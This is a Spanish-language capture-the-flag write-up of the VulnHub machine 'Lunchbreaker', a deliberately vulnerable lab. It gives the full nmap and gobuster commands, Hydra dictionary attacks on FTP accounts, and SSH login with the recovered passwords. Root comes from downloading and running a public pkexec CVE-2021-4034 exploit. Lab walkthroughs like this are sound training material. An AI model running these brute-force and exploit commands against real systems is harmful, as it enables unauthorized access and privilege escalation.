---
title: Lunchbreaker
date: 2024-07-16
categories: [WRITEUPS, VulnHub]
tags: []  # TAG names should always be lowercase
image: /assets/images/vulnhub/logo.png
---

Buenas, en esta máquina realizaremos un **ataque de diccionario** para encontrar la contraseña de un ususario del servicio **FTP**, dentro del servicio encontraremos más usuarios con archivos dentro de sus directorios que deberemos explotar, para la escalada de privilegios nos aprovecharemos de una antigua versión de **pkexec**.

---

En este ***Writeup*** se engloban las siguientes fases:
- **[Reconocimiento](#reconocimiento)**
- **[Explotación](#explotación)**
- **[Escalada de privilegios](#escalada-de-privilegios)**

---

## **Reconocimiento**

Lo primero que realizaremos será un escaneo de puertos con NMAP, para comprobar los que tiene abiertos.

```bash
nmap -p- --open -T5 192.168.1.159 -n -Pn -v
```

![picture](/assets/images/vulnhub/lunch1.png){: w="600" h="300" }

Vamos a volver a realizar un escaneo de los 3 puertos encontrados, para comprobar las versiones, y lanzar una serie de scripts predefinidos de NMAP, para ver si puede encontrar algo interesante.

```bash
nmap -p21,22,80 -sV -sC 192.168.1.159 -v
```

![picture](/assets/images/vulnhub/lunch2.png){: w="600" h="300" }

Encontramos el ussuario **Anonymous** activo, nos metemos en el servicio **FTP** con el usuario **Anonymous** y nos descargamos los archivos **supers3cr3t** y **.s3cr3t** ya que *Wordpress* es un directorio.

![picture](/assets/images/vulnhub/lunch3.png){: w="600" h="300" }

El contenido del archivo **supers3cr3t** está cifrado en **brainfuck**, así que vamos a internet a intentar descifrarlo.

![picture](/assets/images/vulnhub/lunch4.png)
![picture](/assets/images/vulnhub/lunch5.png)

Y el archivo **.s3cr3t** está crifrado en **base64**, así que vamos a descifrarlo.

![picture](/assets/images/vulnhub/lunch6.png)
![picture](/assets/images/vulnhub/lunch7.png)

Vamos a comprobar de que se trata la página web.

Lo único que podemos encontrar es un posible nombre de usuario inspeccionando el código de la página.

![picture](/assets/images/vulnhub/lunch8.png)

Vamos a realizar **Fuzzing** para ver si encontramos algo.

```bash
gobuster dir -u http://192.168.1.159 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .txt,.php,.html,.sh,.png,.jpg,.jpeg -b 404,403
```
No encontramos nada interesante.

![picture](/assets/images/vulnhub/lunch9.png)

---

## **Explotación**

Con el nombre de ususario encontrado, vamos a intentar encontrar la contraseña para el servicio de **FTP**, utilizando un ataque de diccionario con la herramienta **Hydra**.

```bash
hydra -t 64 -l jane -P /usr/share/wordlists/rockyou.txt 192.168.1.159 ftp
```

Y obtenemos la contraseña.

![picture](/assets/images/vulnhub/lunch11.png)

Accedemos mediante las credenciales en el servicio **FTP**, y encontramos un archivo "**keys.txt**" que nos vamos a descargar en nuestra máquina local.

![picture](/assets/images/vulnhub/lunch12.png){: w="600" h="300" }

El contenido del archivo parece estar encriptado.

![picture](/assets/images/vulnhub/lunch13.png)

Buscando en el servicio **FTP**, encontramos mas directorios personales de otros usuarios.

![picture](/assets/images/vulnhub/lunch14.png){: w="600" h="300" }

Vamos a realizar ataques de diccionario, para intentar encontrar la contraseña de los otros usuarios encontrados en el servicio **FTP**. 

```bash
hydra -t 64 -l jim -P /usr/share/wordlists/rockyou.txt 192.168.1.159 ftp
```

```bash
hydra -t 64 -l jules -P /usr/share/wordlists/rockyou.txt 192.168.1.159 ftp
```

Encontramos la contraseña del usuario **jim** y **jules**.

![picture](/assets/images/vulnhub/lunch15.png)

Accedemos mediante **FTP** y sus credenciales.

En el directorio de **jim** no encontramos nada, pero en el de **jules**, encontramos un directorio oculto llamado **".backups"**, y dentro de el, archivos de credenciales, nos los descargamos y comprobamos que son contraseñas.

![picture](/assets/images/vulnhub/lunch16.png)
![picture](/assets/images/vulnhub/lunch17.png)

Ahora intentaremos realizar un ataque de diccionario con los archivos encontrados para intentar encontrar las credenciales de usuario **john**.

Encontramos la contraseña de **FTP**.

![picture](/assets/images/vulnhub/lunch18.png)

Probando con las contraseñas encontradas, intento conectarme mediante el servicio **SSH**, y obtengo resultado con **jules**.

![picture](/assets/images/vulnhub/lunch19.png){: w="600" h="300" }

---

## **Escalada de privilegios**

Dentro de la máquina, viendo los procesos que se están ejecutando en la máquina en búsqueda de escalada de privilegios encontramos el siguiente.

![picture](/assets/images/vulnhub/lunch20.png)

Si buscamos su versión, nos sale la ***0.105***.

![picture](/assets/images/vulnhub/lunch21.png)

Buscando en internet encontramos la vulnerabilidad [**CVE-2021-4034**](https://github.com/joeammond/CVE-2021-4034), la cual nos permite escalar los máximos privilegios.

Nos descargamos el script de **Python**.

```bash
wget https://raw.githubusercontent.com/joeammond/CVE-2021-4034/main/CVE-2021-4034.py
```

![picture](/assets/images/vulnhub/lunch22.png)

Lo ejecutamos, y obtenemnos una shell de **root**.

![picture](/assets/images/vulnhub/lunch23.png)

Podemos leer la única **flag** que tiene la máquina.

![picture](/assets/images/vulnhub/lunch24.png){: w="600" h="300" }


